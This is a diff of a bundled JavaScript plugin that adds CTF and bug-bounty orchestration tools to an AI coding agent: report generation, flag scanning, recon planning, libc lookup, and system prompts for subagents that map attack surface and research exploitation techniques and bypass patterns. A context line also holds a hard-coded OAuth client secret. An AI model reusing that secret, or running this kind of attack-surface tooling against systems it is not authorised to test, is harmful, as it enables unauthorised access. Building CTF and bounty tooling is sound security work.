+    artifacts: extractArtifactPaths(cleaned.join(`
+`))
+  };
+}
+function buildReport(mode, title, sections) {
+  const generatedAt = Date.now();
+  const draft = {
+    mode,
+    title,
+    sections,
+    generatedAt,
+    markdown: ""
+  };
+  return {
+    ...draft,
+    markdown: formatReportMarkdown(draft)
+  };
+}
+function renderWorklogEntries(entries, emptyFallback) {
+  if (entries.length === 0) {
+    return emptyFallback;
+  }
+  return entries.map((entry, index) => `${index + 1}. [${entry.timestamp}] ${entry.action} -> ${entry.result}`).join(`
+`);
+}
+function renderEvidenceEntries(entries, emptyFallback) {
+  if (entries.length === 0) {
+    return emptyFallback;
+  }
+  return entries.map((entry) => {
+    const artifactSuffix = entry.artifacts.length > 0 ? ` | artifacts: ${entry.artifacts.join(", ")}` : "";
+    return `- ${entry.item}: ${entry.verification}${artifactSuffix}`;
+  }).join(`
+`);
+}
+function inferFlag(optionsFlag, evidenceContent) {
+  const explicit = optionsFlag?.trim();
+  if (explicit) {
+    return explicit;
+  }
+  const detected = evidenceContent.match(/(?:flag\{|CTF\{|FLAG\{)[^\s}]+\}/);
+  return detected?.[0] ?? "Not provided";
+}
+function parseWorklog(content) {
+  const lines = content.replace(/\r/g, "").split(`
+`);
+  const entries = [];
+  let currentTimestamp = "unknown";
+  for (const rawLine of lines) {
+    const cleaned = stripHeadingPrefix(stripListPrefix(trimLine(rawLine)));
+    if (!cleaned) {
+      continue;
+    }
+    const timestampParsed = extractTimestamp(cleaned);
+    if (timestampParsed.timestamp) {
+      currentTimestamp = timestampParsed.timestamp;
+    }
+    const body = (timestampParsed.rest || cleaned).trim();
+    if (!body) {
+      continue;
+    }
+    if (/^(goal|next\s*todo|todo|phase|lh|candidate|verified)\s*:/i.test(body)) {
+      continue;
+    }
+    const split = splitActionResult(body);
+    entries.push({
+      timestamp: currentTimestamp,
+      action: split.action,
+      result: split.result
+    });
+  }
+  return entries;
+}
+function parseEvidence(content) {
+  const lines = content.replace(/\r/g, "").split(`
+`);
+  const blocks = [];
+  let currentBlock = [];
+  for (const rawLine of lines) {
+    const trimmed = trimLine(rawLine);
+    if (!trimmed) {
+      if (currentBlock.length > 0) {
+        blocks.push(currentBlock);
+        currentBlock = [];
+      }
+      continue;
+    }
+    if (isEntryBoundary(trimmed) && currentBlock.length > 0) {
+      blocks.push(currentBlock);
+      currentBlock = [trimmed];
+    } else {
+      currentBlock.push(trimmed);
+    }
+  }
+  if (currentBlock.length > 0) {
+    blocks.push(currentBlock);
+  }
+  if (blocks.length === 0 && content.trim()) {
+    blocks.push(content.replace(/\r/g, "").split(`
+`).map((line) => trimLine(line)).filter(Boolean));
+  }
+  const entries = [];
+  for (const block of blocks) {
+    const parsed = finalizeEvidenceBlock(block);
+    if (parsed) {
+      entries.push(parsed);
+    }
+  }
+  return entries;
+}
+function generateCtfWriteup(worklogContent, evidenceContent, options) {
+  const worklogEntries = parseWorklog(worklogContent);
+  const evidenceEntries = parseEvidence(evidenceContent);
+  const challengeName = options?.challengeName?.trim() || "CTF Challenge";
+  const category = options?.category?.trim() || "Unknown";
+  const finalFlag = inferFlag(options?.flag, evidenceContent);
+  const sectionArtifacts = Array.from(new Set(evidenceEntries.flatMap((entry) => entry.artifacts)));
+  const sections = [
+    {
+      title: "Challenge Overview",
+      content: [
+        `- Challenge: ${challengeName}`,
+        `- Category: ${category}`,
+        "- Mode: CTF",
+        `- Worklog Entries: ${worklogEntries.length}`,
+        `- Evidence Items: ${evidenceEntries.length}`
+      ].join(`
+`)
+    },
+    {
+      title: "Methodology",
+      content: renderWorklogEntries(worklogEntries, "No structured worklog entries were found.")
+    },
+    {
+      title: "Verification Evidence",
+      content: renderEvidenceEntries(evidenceEntries, "No verification evidence entries were found."),
+      artifacts: sectionArtifacts
+    },
+    {
+      title: "Final Flag",
+      content: `- ${finalFlag}`
+    }
+  ];
+  return buildReport("CTF", `${challengeName} Writeup`, sections);
+}
+function generateBountyReport(worklogContent, evidenceContent, options) {
+  const worklogEntries = parseWorklog(worklogContent);
+  const evidenceEntries = parseEvidence(evidenceContent);
+  const programName = options?.programName?.trim() || "Target Program";
+  const severity = options?.severity?.trim() || "Unspecified";
+  const endpoint = options?.endpoint?.trim() || "Not specified";
+  const artifacts = Array.from(new Set(evidenceEntries.flatMap((entry) => entry.artifacts)));
+  const sections = [
+    {
+      title: "Executive Summary",
+      content: [
+        `- Program: ${programName}`,
+        `- Reported Severity: ${severity}`,
+        `- Affected Endpoint: ${endpoint}`,
+        "- Mode: BOUNTY"
+      ].join(`
+`)
+    },
+    {
+      title: "Steps to Reproduce",
+      content: renderWorklogEntries(worklogEntries, "No reproducible steps were parsed from WORKLOG.")
+    },
+    {
+      title: "Observed Evidence",
+      content: renderEvidenceEntries(evidenceEntries, "No structured evidence entries were parsed from EVIDENCE."),
+      artifacts
+    },
+    {
+      title: "Impact",
+      content: [
+        `- Claimed Severity: ${severity}`,
+        "- Validate business impact with explicit authorization and reproducible minimal-impact proof."
+      ].join(`
+`)
+    },
+    {
+      title: "Remediation",
+      content: [
+        "1. Reproduce the issue in a controlled environment using the listed steps.",
+        "2. Apply the least-privilege and input-validation control relevant to the root cause.",
+        "3. Re-run the validation evidence checks and confirm the issue no longer reproduces."
+      ].join(`
+`)
+    }
+  ];
+  return buildReport("BOUNTY", `${programName} Security Report`, sections);
+}
+function generateReport(mode, worklogContent, evidenceContent, options) {
+  if (mode === "CTF") {
+    return generateCtfWriteup(worklogContent, evidenceContent, {
+      challengeName: options?.challengeName,
+      category: options?.category,
+      flag: options?.flag
+    });
+  }
+  return generateBountyReport(worklogContent, evidenceContent, {
+    programName: options?.programName,
+    severity: options?.severity,
+    endpoint: options?.endpoint
+  });
+}
+function formatReportMarkdown(report) {
+  const lines = [
+    `# ${report.title}`,
+    "",
+    `- Mode: ${report.mode}`,
+    `- Generated At: ${new Date(report.generatedAt).toISOString()}`,
+    ""
+  ];
+  for (const section of report.sections) {
+    lines.push(`## ${section.title}`);
+    lines.push("");
+    lines.push(section.content.trim() || "No content provided.");
+    if (section.artifacts && section.artifacts.length > 0) {
+      lines.push("");
+      lines.push("Artifacts:");
+      for (const artifact of section.artifacts) {
+        lines.push(`- \`${artifact}\``);
+      }
+    }
+    lines.push("");
+  }
+  return lines.join(`
+`).trimEnd() + `
+`;
+}
+
+// src/orchestration/subagent-dispatch.ts
+var MAX_TRACKS_HARD_CAP = 6;
+var DEFAULT_EXPLORE_TRACKS = 3;
+var DEFAULT_LIBRARIAN_TRACKS = 3;
+var LIBRARIAN_HINTS = [
+  "cve",
+  "cwe",
+  "nvd",
+  "mitre",
+  "advisory",
+  "writeup",
+  "documentation",
+  "docs",
+  "api",
+  "reference",
+  "github",
+  "repo",
+  "framework",
+  "library",
+  "exploit-db"
+];
+var EXPLORE_HINTS = [
+  "file",
+  "files",
+  "source",
+  "code",
+  "codebase",
+  "binary",
+  "elf",
+  "pcap",
+  "trace",
+  "function",
+  "handler",
+  "controller",
+  "endpoint",
+  "grep",
+  "glob",
+  "ast",
+  "line",
+  "sink",
+  "challenge",
+  "artifact"
+];
+function clampMaxTracks(value, fallback) {
+  if (typeof value !== "number" || Number.isNaN(value) || value <= 0) {
+    return fallback;
+  }
+  return Math.min(Math.floor(value), MAX_TRACKS_HARD_CAP);
+}
+function cleanList(values) {
+  if (!values || values.length === 0) {
+    return [];
+  }
+  const dedup = new Set;
+  for (const raw of values) {
+    const value = raw.trim();
+    if (!value) {
+      continue;
+    }
+    dedup.add(value);
+  }
+  return [...dedup];
+}
+function compactQuery(query, fallback) {
+  const trimmed = query.trim();
+  return trimmed ? trimmed : fallback;
+}
+function safeLabel(input) {
+  const normalized = input.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "");
+  return normalized || "query";
+}
+function countHints(haystack, needles) {
+  let score = 0;
+  for (const hint of needles) {
+    if (haystack.includes(hint)) {
+      score += 1;
+    }
+  }
+  return score;
+}
+function detectSearchTypes(query) {
+  const q = query.toLowerCase();
+  const selected = new Set;
+  if (q.includes("cve") || q.includes("cwe") || q.includes("advisory") || q.includes("nvd")) {
+    selected.add("cve");
+  }
+  if (q.includes("writeup") || q.includes("ctf") || q.includes("walkthrough")) {
+    selected.add("writeup");
+  }
+  if (q.includes("docs") || q.includes("documentation") || q.includes("api") || q.includes("framework")) {
+    selected.add("docs");
+  }
+  if (q.includes("github") || q.includes("repo") || q.includes("source")) {
+    selected.add("github");
+  }
+  if (selected.size === 0) {
+    return ["cve", "writeup", "docs"];
+  }
+  return [...selected];
+}
+function buildExploreTracks(state, query, focusAreas) {
+  const modeHint = state.mode === "CTF" ? "CTF mode: challenge-centric artifact and binary/code attack-surface discovery." : "BOUNTY mode: codebase-centric vulnerability pattern review with minimal-impact assumptions.";
+  const focusHint = focusAreas.length > 0 ? `Prioritize these focus areas: ${focusAreas.join(", ")}.` : "Prioritize likely hot spots: inputs, trust boundaries, auth/session, parsing, deserialization, command/file/network sinks.";
+  return [
+    {
+      purpose: "aegis-explore-surface-map",
+      agent: "aegis-explore",
+      prompt: [
+        "[Aegis Subagent Dispatch: Explore / Surface Map]",
+        `Query: ${query}`,
+        modeHint,
+        focusHint,
+        "Use grep/glob/read/ast_grep_search to map attack surface quickly.",
+        "Output <=20 bullet lines with file:line references."
+      ].join(`
+`)
+    },
+    {
+      purpose: "aegis-explore-vuln-patterns",
+      agent: "aegis-explore",
+      prompt: [
+        "[Aegis Subagent Dispatch: Explore / Vulnerability Patterns]",
+        `Query: ${query}`,
+        "Search for security-relevant patterns: weak validation, trust-boundary gaps, dangerous sinks, parser misuse, crypto misuse, authz/authn mistakes.",
+        "Use targeted grep and AST pattern search only.",
+        "Output <=20 bullet lines with file:line references."
+      ].join(`
+`)
+    },
+    {
+      purpose: "aegis-explore-evidence-cut",
+      agent: "aegis-explore",
+      prompt: [
+        "[Aegis Subagent Dispatch: Explore / Evidence Cut]",
+        `Query: ${query}`,
+        "Collect the highest-signal findings only and reduce noise.",
+        "Rank findings by exploitability and confidence.",
+        "Output <=20 bullet lines with file:line references."
+      ].join(`
+`)
+    }
+  ];
+}
+function buildLibrarianPrompt(type, query) {
+  if (type === "cve") {
+    return [
+      "[Aegis Subagent Dispatch: Librarian / CVE Intelligence]",
+      `Query: ${query}`,
+      "Find CVEs/advisories relevant to this query.",
+      "Prefer NVD, vendor advisories, and high-quality writeups.",
+      "Return 3-5 references with URL and 1-2 line applicability summary."
+    ].join(`
+`);
+  }
+  if (type === "writeup") {
+    return [
+      "[Aegis Subagent Dispatch: Librarian / Similar Writeups]",
+      `Query: ${query}`,
+      "Find similar CTF or real-world incident writeups with actionable exploitation notes.",
+      "Prioritize high-signal methodology and reproducible steps.",
+      "Return 3-5 references with URL and 1-2 line applicability summary."
+    ].join(`
+`);
+  }
+  if (type === "docs") {
+    return [
+      "[Aegis Subagent Dispatch: Librarian / Official Documentation]",
+      `Query: ${query}`,
+      "Find official docs and security guidance for frameworks, APIs, libraries, and configurations involved.",
+      "Prefer primary documentation and version-specific guidance.",
+      "Return 3-5 references with URL and 1-2 line applicability summary."
+    ].join(`
+`);
+  }
+  return [
+    "[Aegis Subagent Dispatch: Librarian / GitHub Examples]",
+    `Query: ${query}`,
+    "Find relevant OSS code examples and security discussions in GitHub repositories/issues.",
+    "Prioritize patterns that map to likely exploitation or validation techniques.",
+    "Return 3-5 references with URL and 1-2 line applicability summary."
+  ].join(`
+`);
+}
+function buildLibrarianTracks(searchTypes, query) {
+  return searchTypes.map((searchType) => ({
+    purpose: `aegis-librarian-${searchType}`,
+    agent: "aegis-librarian",
+    prompt: buildLibrarianPrompt(searchType, query)
+  }));
+}
+function planExploreDispatch(state, query, options) {
+  const normalizedQuery = compactQuery(query, "targeted attack-surface exploration");
+  const focusAreas = cleanList(options?.focusAreas);
+  const maxTracks = clampMaxTracks(options?.maxTracks, DEFAULT_EXPLORE_TRACKS);
+  const tracks = buildExploreTracks(state, normalizedQuery, focusAreas).slice(0, maxTracks);
+  return {
+    label: `aegis-explore-${safeLabel(normalizedQuery)}`,
+    tracks
+  };
+}
+function planLibrarianDispatch(state, query, options) {
+  const normalizedQuery = compactQuery(query, "security reference lookup");
+  const maxTracks = clampMaxTracks(options?.maxTracks, DEFAULT_LIBRARIAN_TRACKS);
+  const requestedTypes = cleanList(options?.searchTypes);
+  const searchTypes = requestedTypes.length > 0 ? requestedTypes : detectSearchTypes(`${state.mode} ${normalizedQuery}`);
+  const tracks = buildLibrarianTracks(searchTypes, normalizedQuery).slice(0, maxTracks);
+  return {
+    label: `aegis-librarian-${safeLabel(normalizedQuery)}`,
+    tracks
+  };
+}
+function detectSubagentType(query) {
+  const normalized = query.toLowerCase();
+  if (normalized.includes("cve") || normalized.includes("docs") || normalized.includes("api")) {
+    return "librarian";
+  }
+  if (normalized.includes("file") || normalized.includes("code") || normalized.includes("binary")) {
+    return "explore";
+  }
+  const librarianScore = countHints(normalized, LIBRARIAN_HINTS);
+  const exploreScore = countHints(normalized, EXPLORE_HINTS);
+  if (librarianScore > exploreScore) {
+    return "librarian";
+  }
+  return "explore";
 }
 
 // src/tools/control-tools.ts
@@ -30316,15 +33360,15 @@ function createControlTools(store, notesStore, config3, projectDir, client, para
     const base = join7(projectDir, ".claude");
     const skillPath = join7(base, "skills", trimmed, "SKILL.md");
     const commandPath = join7(base, "commands", `${trimmed}.md`);
-    const candidates = [];
+    const candidates2 = [];
     if (existsSync6(skillPath))
-      candidates.push({ kind: "skill", path: skillPath });
+      candidates2.push({ kind: "skill", path: skillPath });
     if (existsSync6(commandPath))
-      candidates.push({ kind: "command", path: commandPath });
-    if (candidates.length === 0) {
+      candidates2.push({ kind: "command", path: commandPath });
+    if (candidates2.length === 0) {
       return { ok: false, reason: "not found" };
     }
-    const chosen = candidates[0];
+    const chosen = candidates2[0];
     try {
       const st = statSync2(chosen.path);
       if (!st.isFile()) {
@@ -31209,7 +34253,7 @@ function createControlTools(store, notesStore, config3, projectDir, client, para
     ctf_orch_exploit_template_list: tool({
       description: "List built-in exploit templates (PWN/CRYPTO)",
       args: {
-        domain: schema3.enum(["PWN", "CRYPTO"]).optional(),
+        domain: schema3.enum(["PWN", "CRYPTO", "WEB", "REV", "FORENSICS"]).optional(),
         session_id: schema3.string().optional()
       },
       execute: async (args, context) => {
@@ -31233,6 +34277,218 @@ function createControlTools(store, notesStore, config3, projectDir, client, para
           return JSON.stringify({ ok: false, reason: "template not found", sessionID, domain: args.domain, id: args.id }, null, 2);
         }
         return JSON.stringify({ ok: true, sessionID, template: entry }, null, 2);
+      }
+    }),
+    ctf_auto_triage: tool({
+      description: "Auto-triage a challenge file: detect type, suggest target, generate scan commands",
+      args: {
+        file_path: schema3.string().min(1),
+        file_output: schema3.string().optional()
+      },
+      execute: async (args) => {
+        const result = triageFile(args.file_path, args.file_output);
+        return JSON.stringify(result, null, 2);
+      }
+    }),
+    ctf_flag_scan: tool({
+      description: "Scan text for flag patterns and return candidates",
+      args: {
+        text: schema3.string().min(1),
+        source: schema3.string().default("manual"),
+        custom_pattern: schema3.string().optional()
+      },
+      execute: async (args) => {
+        if (args.custom_pattern) {
+          setCustomFlagPattern(args.custom_pattern);
+        }
+        const found = scanForFlags(args.text, args.source);
+        return JSON.stringify({
+          found,
+          alert: found.length > 0 ? buildFlagAlert(found) : null,
+          allCandidates: getCandidates()
+        }, null, 2);
+      }
+    }),
+    ctf_pattern_match: tool({
+      description: "Match known CTF/security patterns in text",
+      args: {
+        text: schema3.string().min(1),
+        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]).optional()
+      },
+      execute: async (args) => {
+        const targetType = args.target_type;
+        const matches = matchPatterns(args.text, targetType);
+        return JSON.stringify({
+          matches,
+          summary: matches.length > 0 ? buildPatternSummary(matches) : "No patterns matched."
+        }, null, 2);
+      }
+    }),
+    ctf_recon_pipeline: tool({
+      description: "Plan a multi-phase BOUNTY recon pipeline for a target",
+      args: {
+        target: schema3.string().min(1),
+        scope: schema3.array(schema3.string()).optional(),
+        templates: schema3.string().optional()
+      },
+      execute: async (args, context) => {
+        const state = store.get(context.sessionID);
+        const pipeline = planReconPipeline(state, config3, args.target, { scope: args.scope });
+        return JSON.stringify({ pipeline, templates: args.templates ?? null }, null, 2);
+      }
+    }),
+    ctf_delta_scan: tool({
+      description: "Save/query/compare scan snapshots for delta-aware scanning",
+      args: {
+        action: schema3.enum(["save", "query", "should_rescan"]),
+        target: schema3.string().min(1),
+        template_set: schema3.string().default("default"),
+        findings: schema3.array(schema3.string()).optional(),
+        hosts: schema3.array(schema3.string()).optional(),
+        ports: schema3.array(schema3.number()).optional(),
+        max_age_ms: schema3.number().optional()
+      },
+      execute: async (args) => {
+        if (args.action === "save") {
+          const snapshot = {
+            id: randomUUID(),
+            target: args.target,
+            templateSet: args.template_set,
+            timestamp: Date.now(),
+            assets: [
+              ...args.hosts ?? [],
+              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
+            ],
+            findings: args.findings ?? []
+          };
+          saveScanSnapshot(snapshot);
+          return JSON.stringify({ ok: true, saved: snapshot }, null, 2);
+        }
+        if (args.action === "query") {
+          const current = {
+            id: randomUUID(),
+            target: args.target,
+            templateSet: args.template_set,
+            timestamp: Date.now(),
+            assets: [
+              ...args.hosts ?? [],
+              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
+            ],
+            findings: args.findings ?? []
+          };
+          const latest = getLatestSnapshot(args.target);
+          const delta = latest ? computeDelta(latest, current) : null;
+          const summary = buildDeltaSummary(args.target, {
+            ...current
+          });
+          return JSON.stringify({ ok: true, summary, latest, delta }, null, 2);
+        }
+        if (args.action === "should_rescan") {
+          const rescan = shouldRescan(args.target, args.template_set, args.max_age_ms);
+          return JSON.stringify({ ok: true, shouldRescan: rescan }, null, 2);
+        }
+        return JSON.stringify({ ok: false, reason: "unknown action" }, null, 2);
+      }
+    }),
+    ctf_tool_recommend: tool({
+      description: "Get recommended security tools for a target type",
+      args: {
+        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])
+      },
+      execute: async (args) => {
+        const tools = recommendedTools(args.target_type);
+        return JSON.stringify({ tools }, null, 2);
+      }
+    }),
+    ctf_libc_lookup: tool({
+      description: "Lookup libc versions from leaked function addresses",
+      args: {
+        lookups: schema3.array(schema3.object({
+          symbol: schema3.string().min(1),
+          address: schema3.string().min(1)
+        })),
+        compute_base_leaked_address: schema3.string().optional(),
+        compute_base_symbol_offset: schema3.number().optional()
+      },
+      execute: async (args) => {
+        const requests = args.lookups.map((l) => ({
+          symbolName: l.symbol,
+          address: l.address
+        }));
+        const result = localLookup(requests);
+        const summary = buildLibcSummary(result);
+        const libcRipUrl = buildLibcRipUrl(requests);
+        let base = null;
+        if (args.compute_base_leaked_address && typeof args.compute_base_symbol_offset === "number") {
+          base = computeLibcBase(args.compute_base_leaked_address, args.compute_base_symbol_offset);
+        }
+        return JSON.stringify({ result, summary, libcRipUrl, computedBase: base }, null, 2);
+      }
+    }),
+    ctf_env_parity: tool({
+      description: "Check environment parity between local and remote for PWN challenges",
+      args: {
+        dockerfile_content: schema3.string().optional(),
+        ldd_output: schema3.string().optional(),
+        binary_path: schema3.string().optional()
+      },
+      execute: async (args) => {
+        const remote = {};
+        if (args.dockerfile_content) {
+          Object.assign(remote, parseDockerfile(args.dockerfile_content));
+        }
+        const local = {};
+        if (args.ldd_output) {
+          const parsed = parseLddOutput(args.ldd_output);
+          if (parsed) {
+            local.libcVersion = parsed.version;
+            local.libcPath = parsed.libcPath;
+          }
+        }
+        const report = buildParityReport(local, remote);
+        const summary = buildParitySummary(report);
+        const localCommands = localEnvCommands();
+        return JSON.stringify({ report, summary, localCommands }, null, 2);
+      }
+    }),
+    ctf_report_generate: tool({
+      description: "Generate a CTF writeup or BOUNTY report from session notes",
+      args: {
+        mode: schema3.enum(["CTF", "BOUNTY"]),
+        challenge_name: schema3.string().default("Challenge"),
+        worklog: schema3.string().default(""),
+        evidence: schema3.string().default(""),
+        target_type: schema3.string().optional(),
+        flag: schema3.string().optional()
+      },
+      execute: async (args) => {
+        const reportOptions = {
+          challengeName: args.challenge_name,
+          programName: args.challenge_name
+        };
+        if (args.target_type) {
+          reportOptions.category = args.target_type;
+          reportOptions.endpoint = args.target_type;
+        }
+        if (args.flag) {
+          reportOptions.flag = args.flag;
+        }
+        const report = generateReport(args.mode, args.worklog, args.evidence, reportOptions);
+        const markdown = formatReportMarkdown(report);
+        return JSON.stringify({ report, markdown }, null, 2);
+      }
+    }),
+    ctf_subagent_dispatch: tool({
+      description: "Plan a dispatch for aegis-explore or aegis-librarian subagent",
+      args: {
+        query: schema3.string().min(1),
+        type: schema3.enum(["explore", "librarian", "auto"]).default("auto")
+      },
+      execute: async (args, context) => {
+        const state = store.get(context.sessionID);
+        const agentType = args.type === "auto" ? detectSubagentType(args.query) : args.type;
+        const plan = agentType === "explore" ? planExploreDispatch(state, args.query) : planLibrarianDispatch(state, args.query);
+        return JSON.stringify({ agentType, plan }, null, 2);
       }
     }),
     ctf_orch_pty_create: tool({
@@ -32139,6 +35395,65 @@ function createAegisDeepAgent(model = DEFAULT_MODEL4) {
 }
 var aegisDeepAgent = createAegisDeepAgent();
 
+// src/agents/aegis-explore.ts
+var AEGIS_EXPLORE_SYSTEM_PROMPT = `You are "Aegis-Explore" \u2014 a lightweight contextual grep subagent for CTF/BOUNTY analysis.
+
+Mission:
+- Perform fast, targeted search and pattern discovery on challenge files, binaries, and codebases.
+- Focus on attack surface identification and vulnerability pattern discovery.
+- Support both CTF (challenge artifact analysis) and BOUNTY (codebase security review) modes.
+
+Allowed workflow:
+- Use grep, glob, read, and ast_grep_search for deterministic discovery.
+- Prioritize high-signal locations first: entry points, handlers/controllers, auth/session logic, parsers, deserialization, command execution, file access, crypto usage, and unsafe sinks.
+- Trace suspicious patterns to concrete file and line references.
+
+Hard constraints:
+- Never attempt to solve, exploit, or patch. Observe and report only.
+- Keep output to at most 20 lines.
+- Use bullet points only.
+- Every bullet must include file:line references when available.
+
+Output format:
+- "- <file>:<line> - <observation>"
+- Include concrete findings only: discovered surface, risky patterns, weak validation points, suspicious constants/flows, and likely vulnerability classes.`;
+function createAegisExploreAgent() {
+  return {
+    systemPrompt: AEGIS_EXPLORE_SYSTEM_PROMPT
+  };
+}
+
+// src/agents/aegis-librarian.ts
+var AEGIS_LIBRARIAN_SYSTEM_PROMPT = `You are "Aegis-Librarian" \u2014 an external reference research subagent for CTF/BOUNTY.
+
+Mission:
+- Search external security references: official docs, CVE databases, GitHub repositories, and writeups.
+- Focus on exploitation techniques, known vulnerabilities, and similar challenge or real-world patterns.
+- Support security-focused research for CVEs, exploit chains, framework/library weaknesses, and defensive bypass patterns.
+
+Tooling:
+- Use websearch_web_search_exa for broad discovery.
+- Use context7 for official framework/library documentation.
+- Use grep_app_searchGitHub for real OSS implementation patterns and exploit-adjacent code examples.
+
+Output contract:
+- Return 3-5 highly relevant references only.
+- Always cite sources with URLs.
+- For each reference, include title, URL, and a 1-2 line applicability summary tied to the current query.
+- Prioritize source quality and recency.
+
+Format:
+1. <Title>
+   - URL: <https://...>
+   - Relevance: <1-2 lines>
+
+If evidence quality is weak, explicitly say what is missing and which source type to search next.`;
+function createAegisLibrarianAgent() {
+  return {
+    systemPrompt: AEGIS_LIBRARIAN_SYSTEM_PROMPT
+  };
+}
+
 // src/auth/antigravity/constants.ts
 var ANTIGRAVITY_CLIENT_ID = "1071006060591-tmhssin2h21lcre235vtolojh4g403ep.apps.googleusercontent.com";
 var ANTIGRAVITY_CLIENT_SECRET = "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";
@@ -33017,8 +36332,8 @@ function extractUsageFromHeaders(headers) {
   const cached3 = headers.get("x-antigravity-cached-content-token-count");
   const total = headers.get("x-antigravity-total-token-count");
   const prompt = headers.get("x-antigravity-prompt-token-count");
-  const candidates = headers.get("x-antigravity-candidates-token-count");
-  if (!cached3 && !total && !prompt && !candidates) {
+  const candidates2 = headers.get("x-antigravity-candidates-token-count");
+  if (!cached3 && !total && !prompt && !candidates2) {
     return;
   }
   const usage = {};
@@ -33040,8 +36355,8 @@ function extractUsageFromHeaders(headers) {
       usage.promptTokenCount = parsed;
     }
   }
-  if (candidates) {
-    const parsed = parseInt(candidates, 10);
+  if (candidates2) {
+    const parsed = parseInt(candidates2, 10);
     if (!isNaN(parsed)) {
       usage.candidatesTokenCount = parsed;
     }
@@ -33993,13 +37308,13 @@ function extractErrorMessage(error92) {
     return error92.message || String(error92);
   }
   if (isRecord5(error92)) {
-    const candidates = [
+    const candidates2 = [
       error92,
       error92.error,
       error92.data,
       isRecord5(error92.data) ? error92.data.error : null
     ];
-    for (const item of candidates) {
+    for (const item of candidates2) {
       if (!item)
         continue;
       if (typeof item === "string" && item.trim().length > 0) {
@@ -34588,12 +37903,12 @@ function listSkillNames(skillsDir) {
 function discoverAvailableSkills(projectDir, environment = process.env) {
   const out = new Set;
   const opencodeDir = resolveOpencodeDir(environment);
-  const candidates = [
+  const candidates2 = [
     opencodeDir ? join8(opencodeDir, "skills") : "",
     join8(projectDir, ".opencode", "skills"),
     join8(projectDir, ".claude", "skills")
   ].filter(Boolean);
-  for (const dir of candidates) {
+  for (const dir of candidates2) {
     for (const name of listSkillNames(dir)) {
       out.add(name);
     }
@@ -34680,11 +37995,11 @@ function truncate2(text, maxChars) {
 }
 async function runClaudeHook(params) {
   const hooksDir = join9(params.projectDir, ".claude", "hooks");
-  const candidates = [
+  const candidates2 = [
     join9(hooksDir, `${params.hookName}.sh`),
     join9(hooksDir, `${params.hookName}.bash`)
   ];
-  const script = candidates.find((p) => existsSync8(p) && isFile(p));
+  const script = candidates2.find((p) => existsSync8(p) && isFile(p));
   if (!script) {
     return { ok: true };
   }
@@ -34917,14 +38232,14 @@ var OhMyAegisPlugin = async (ctx) => {
     const home = process.env.HOME ?? "";
     const xdg = process.env.XDG_CONFIG_HOME ?? "";
     const appData = process.env.APPDATA ?? "";
-    const candidates = [
+    const candidates2 = [
       join10(ctx.directory, ".opencode", "opencode.json"),
       join10(ctx.directory, "opencode.json"),
       xdg ? join10(xdg, "opencode", "opencode.json") : "",
       home ? join10(home, ".config", "opencode", "opencode.json") : "",
       appData ? join10(appData, "opencode", "opencode.json") : ""
     ].filter(Boolean);
-    for (const candidate of candidates) {
+    for (const candidate of candidates2) {
       if (!candidate || !existsSync9(candidate))
         continue;
       try {
@@ -35033,11 +38348,11 @@ var OhMyAegisPlugin = async (ctx) => {
   };
   const loadClaudeDenyRules = () => {
     const settingsDir = join10(ctx.directory, ".claude");
-    const candidates = [
+    const candidates2 = [
       join10(settingsDir, "settings.json"),
       join10(settingsDir, "settings.local.json")
     ];
-    const sourcePaths = candidates.filter((p) => existsSync9(p));
+    const sourcePaths = candidates2.filter((p) => existsSync9(p));
     let sourceMtimeMs = 0;
     for (const p of sourcePaths) {
       try {
@@ -35629,6 +38944,12 @@ var OhMyAegisPlugin = async (ctx) => {
         }
         if (!("aegis-deep" in existingAgents)) {
           nextAgents["aegis-deep"] = createAegisDeepAgent(defaultModel);
+        }
+        if (!("aegis-explore" in existingAgents)) {
+          nextAgents["aegis-explore"] = createAegisExploreAgent();
+        }
+        if (!("aegis-librarian" in existingAgents)) {
+          nextAgents["aegis-librarian"] = createAegisLibrarianAgent();
         }
         runtimeConfig.agent = nextAgents;
       } catch (error92) {
@@ -36489,6 +39810,19 @@ ${output.output}`;
               truncated
             ].join(`
 `);
+          }
+        }
+        if (config3.flag_detector?.enabled !== false) {
+          const outputText = typeof output.output === "string" ? output.output : "";
+          if (outputText.length > 0 && outputText.length < 1e5 && containsFlag(outputText)) {
+            const flags = scanForFlags(outputText, `tool:${input.tool}`);
+            if (flags.length > 0) {
+              const alert = buildFlagAlert(flags);
+              safeNoteWrite("flag-detector", () => {
+                notesStore.recordScan(`Flag candidate detected in ${input.tool} output: ${flags.map((f) => f.flag).join(", ")}
+${alert}`);
+              });
+            }
           }
         }
       } catch (error92) {
